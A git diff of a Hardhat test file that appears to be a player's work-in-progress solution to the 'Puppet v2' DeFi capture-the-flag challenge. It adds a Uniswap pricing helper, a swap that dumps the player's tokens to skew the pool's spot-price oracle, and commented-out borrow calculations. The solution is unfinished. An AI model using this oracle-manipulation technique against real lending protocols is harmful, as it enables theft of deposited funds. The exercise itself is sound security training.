@@ -5,7 +5,9 @@ const routerJson = require("@uniswap/v2-periphery/build/UniswapV2Router02.json")
 const { ethers } = require('hardhat');
 const { expect } = require('chai');
 const { setBalance } = require("@nomicfoundation/hardhat-network-helpers");
-
+function calculateTokenToEthInputPrice(tokensSold, tokensInReserve, etherInReserve) {
+    return (tokensSold * 997n * etherInReserve) / (tokensInReserve * 1000n + tokensSold * 997n);
+}
 describe('[Challenge] Puppet v2', function () {
     let deployer, player;
     let token, weth, uniswapFactory, uniswapRouter, uniswapExchange, lendingPool;
@@ -83,6 +85,32 @@ describe('[Challenge] Puppet v2', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+        // let receiver = await (await ethers.getContractFactory('FlashSwapReceiver', player)).deploy(
+        //     uniswapExchange.address, weth.address, lendingPool.address, token.address, player.address,
+        //     {gasLimit: 1e6}
+        // );
+
+        // let funcSig = ethers.utils.id("borrow(uint256)").slice(0,10);
+        // let calldata = ethers.utils.hexConcat([
+        //     funcSig, 
+        //     ethers.utils.defaultAbiCoder.encode(['uint256'], [POOL_INITIAL_TOKEN_BALANCE])
+        //     ]);
+        await token.connect(player).approve(uniswapExchange.address, PLAYER_INITIAL_TOKEN_BALANCE);
+        await uniswapExchange.connect(player).swap(
+            PLAYER_INITIAL_TOKEN_BALANCE, 0, player.address, '0x',
+            {gasLimit: 1e6}
+        );
+        
+        // let price = calculateTokenToEthInputPrice(PLAYER_INITIAL_TOKEN_BALANCE, UNISWAP_INITIAL_TOKEN_RESERVE, UNISWAP_INITIAL_WETH_RESERVE);
+        // console.log(ethers.utils.formatEther(price));
+        // let price2 = (POOL_INITIAL_TOKEN_BALANCE * 10n ** 18n) * (UNISWAP_INITIAL_WETH_RESERVE - price) / (UNISWAP_INITIAL_TOKEN_RESERVE + PLAYER_INITIAL_TOKEN_BALANCE); 
+        // console.log(UNISWAP_INITIAL_WETH_RESERVE - price);
+        // console.log(UNISWAP_INITIAL_TOKEN_RESERVE + PLAYER_INITIAL_TOKEN_BALANCE);
+        // console.log(price2);
+        // let depositRequired = (price2 * 3n) / 10n ** 18n;
+        // console.log(ethers.utils.formatEther(depositRequired));
+        // let userBal = price + PLAYER_INITIAL_ETH_BALANCE;
+        // console.log(ethers.utils.formatEther(userBal));
     });
 
     after(async function () {
